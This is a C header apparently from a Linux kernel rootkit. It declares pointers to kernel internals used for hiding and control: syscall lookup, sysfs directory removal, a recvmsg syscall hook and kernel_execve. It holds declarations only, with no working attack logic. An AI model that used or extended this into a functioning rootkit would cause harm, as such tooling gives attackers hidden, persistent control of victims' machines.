#ifndef KERNEL_FUNCTIONS_H
#define KERNEL_FUNCTIONS_H

#include <linux/kobject.h>
#include <net/tcp.h>
#include <net/udp.h>

#include "sysmap.h"

#define KFUN(name) fn_##name = (void*) rk_##name

extern pte_t* (*fn_lookup_address)(unsigned long address, unsigned int* level);
extern int (*fn_sysfs_remove_dir)(struct kobject*);
extern struct sock* (*fn_netlink_lookup)(struct net*, int, u32);
extern unsigned long (*fn_kallsyms_lookup_name)(const char*);
extern asmlinkage long (*fn_sys_recvmsg)(int, struct msghdr*, unsigned);
extern int (*kernel_execve)(const char*, char *const argv[], char *const envp[]);

#endif
